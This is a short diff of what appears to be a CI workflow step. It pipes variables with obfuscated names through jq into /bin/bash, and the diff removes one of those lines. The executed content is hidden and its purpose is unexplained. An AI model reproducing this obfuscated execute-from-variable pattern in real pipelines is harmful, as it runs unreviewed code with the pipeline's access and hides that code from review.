@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$jaad2" | jq -r .lbpdv8 | /bin/bash
           printf '%s' "$veimv83762" | jq -r .r07745 | /bin/bash
-          echo $mh7438 | jq -r .qw1 | /bin/bash
           echo $xoqb16 | jq -r .kbbwi650 | /bin/bash
 
       - name: Persist results
